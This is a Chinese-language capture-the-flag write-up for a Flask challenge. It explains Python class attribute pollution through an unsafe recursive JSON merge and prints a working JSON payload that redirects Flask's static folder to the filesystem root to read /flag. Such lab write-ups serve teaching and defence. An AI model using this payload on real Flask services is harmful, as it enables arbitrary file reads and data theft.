# basic_flask

## 题目简述

服务端使用 Flask 提供了一个支持递归合并 JSON 的接口：`GET /` 返回源码，`POST /` 则把请求体合并到全局 `Dst` 实例中。容器构建时把 flag 写入 `/flag`。

漏洞本质是 **Python 类属性污染**。递归合并函数同时允许通过 `getattr` 读取属性、通过 `setattr` 写入属性，因此攻击者可以从实例沿 `__class__`、`__init__` 和 `__globals__` 访问模块全局变量，最终改写 Flask 应用对象的内部属性。

## 解题过程

关键合并逻辑如下：

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

污染链各节点的含义为：

1. `dst.__class__` 取得 `Dst` 类；
2. `Dst.__init__` 取得初始化函数；
3. `Dst.__init__.__globals__` 取得定义该函数的模块全局字典；
4. 全局字典中的 `app` 就是 Flask 应用实例；
5. 改写 `app._static_folder`，即可控制 Flask 静态文件路由使用的根目录。

提交以下 JSON，把静态目录从默认位置改为一个从 `/app` 回退到文件系统根目录的路径：

```http
POST / HTTP/1.1
Host: TARGET
Content-Type: application/json

{
  "__class__": {
    "__init__": {
      "__globals__": {
        "app": {
          "_static_folder": "../../../../../../../../"
        }
      }
    }
  }
}
```

Flask 默认注册了 `/static/<path:filename>` 路由。污染完成后，访问 `/static/flag` 实际读取的就是根目录下的 `/flag`：

```http
GET /static/flag HTTP/1.1
Host: TARGET
```

响应为：

```text
0xGame{Try_To_Hack_Flask!}
```

## 方法总结

看到递归合并函数同时使用 `getattr`/`setattr` 时，应检查能否沿 Python 魔术属性从普通实例走到类、函数和模块全局变量。本题的完整利用链是 `dst → __class__ → __init__ → __globals__ → app → _static_folder`，再借 Flask 既有静态文件路由读取 `/flag`。这类问题应称为类属性污染或对象属性污染，不能与 JavaScript 原型链污染混为一谈。
